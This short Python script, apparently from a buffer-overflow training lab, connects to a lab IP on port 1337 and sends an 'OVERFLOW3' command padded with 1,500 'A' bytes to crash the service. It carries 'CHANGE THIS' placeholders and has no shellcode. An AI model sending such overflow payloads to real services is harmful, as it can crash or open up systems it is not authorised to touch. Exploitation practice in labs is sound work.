#!/usr/bin/env python3

import socket

host, port = "10.10.154.224", 1337 # CHANGE THIS.

command = b"OVERFLOW3 " # CHANGE THIS.

payload = b"".join(
	[
		command,
		b"A" * 1500, #CHANGE THIS.
	]
)

with socket.socket() as s:
	s.connect((host, port))
	s.send(payload)